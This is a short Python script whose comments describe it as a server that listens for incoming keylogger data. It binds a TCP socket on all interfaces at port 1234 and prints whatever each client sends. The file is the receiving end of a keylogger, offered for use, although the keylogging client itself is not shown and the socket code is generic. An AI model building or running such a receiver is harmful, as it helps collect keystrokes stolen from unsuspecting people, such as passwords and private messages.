# Import socket module to create a TCP server
import socket 

# Function to start the server that listens for incoming keylogger data
def start_server(ip, port):
    # Create a TCP socket using IPv4
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Bind the socket to the specified IP and port
    server.bind((ip, port))
    
    # Start listening for incoming connections (max 5 in queue)
    server.listen(5)
    print(f"Server is listening on {ip}:{port}")

    # Continuously accept and handle incoming connections
    while True:
        # Accept a client connection
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
        
        # Receive up to 1024 bytes of data from the client and decode it
        data = client_socket.recv(1024).decode()
        
        # If data is received, print it
        if data:
            print(f"Received data : {data}")
        
        # Close the client connection
        client_socket.close()

# Entry point of the script: start the server on all interfaces (0.0.0.0) at port 1234
if __name__ == "__main__":
    start_server("0.0.0.0", 1234)
